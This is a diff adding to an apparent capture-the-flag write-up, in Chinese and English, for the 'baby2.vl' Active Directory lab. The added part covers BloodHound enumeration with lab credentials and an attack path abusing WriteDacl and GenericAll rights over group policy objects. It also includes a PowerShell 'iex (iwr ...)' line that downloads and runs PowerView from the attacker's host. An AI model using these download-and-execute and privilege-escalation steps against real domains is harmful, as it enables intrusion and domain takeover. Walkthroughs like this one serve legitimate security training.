@@ -299,4 +299,49 @@ PS C:\Windows\system32> cat ..\..\user.txt
 ### Lateral Movement 横向移动
 ```
 [★]$ bloodhound-python -d baby2.vl -u Carl.Moore -p Carl.Moore -c all -ns 10.129.234.72 --dns-tcp
+
+[★]$ sudo neo4j start
+Directories in use:
+home:         /var/lib/neo4j
+config:       /etc/neo4j
+logs:         /var/log/neo4j
+plugins:      /var/lib/neo4j/plugins
+import:       /var/lib/neo4j/import
+data:         /var/lib/neo4j/data
+certificates: /var/lib/neo4j/certificates
+licenses:     /var/lib/neo4j/licenses
+run:          /var/lib/neo4j/run
+Starting Neo4j.
+Started neo4j (pid:181033). It is available at http://localhost:7474
+There may be a short delay until the server is ready.
+```
+#### username: neo4j
+#### password: neo4j
+```
+[★]$ bloodhound
+```
+#### Upload Data 上传了多个.json 
+#### 搜索CARL.MOOER 双击选中 ! Mark User as Owned
+####  (In the Bloodhound menu -> Node Info Tab -> Outbound Object Control ->Transitive Object Control )
+#### 通过CARL.MOOER 找到了  OFFICE@ABAY2.VL Inbound Object Control ->Transitive Object Control
+#### 找到了 AMELIA.GRIFFITHS@BABY2.VL 
+![图片](images/2026030602.png)
+#### Amelia Griffiths -> MemberOf -> LEGACY@BABY2.VL
+#### LEGACY@BABY2.VL -> WriteDacl -> GPOADM@BABY2.VL,GPO-MANAGEMENT@BABY2.VL
+![图片](images/2026030603.png)
+```
+1. “Amelia Griffiths”这个用户属于老用户组的一员。
+2. 该保留组对 GPO-MANAGEMENT（OU）以及 gpoadm 用户账户设置了“写入访问控制列表”权限。
+3. gpoadm 用户对默认域策略以及默认域控制器策略的通用所有访问控制列表（ACL）拥有权限。
+```
+#### 攻击步骤如下：以“Amelia Griffiths”用户身份滥用“写 DACL”访问控制列表，以获取对“gpoadm”用户账户的访问权限。然后，对组策略对象滥用“通用所有”访问控制列表。
+#### 首先，要从 Windows 中滥用“写 DACL”访问控制列表，我们必须将 PowerView 转移到目标位置，然后进行导入。
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+```
+[★]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
+[★]$ python3 -m http.server 8011
+Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
+```
+```
+PS C:\Users\amelia.griffiths> iex (iwr -usebasicparsing http://10.10.14.27:8011/PowerView.ps1)
 ```
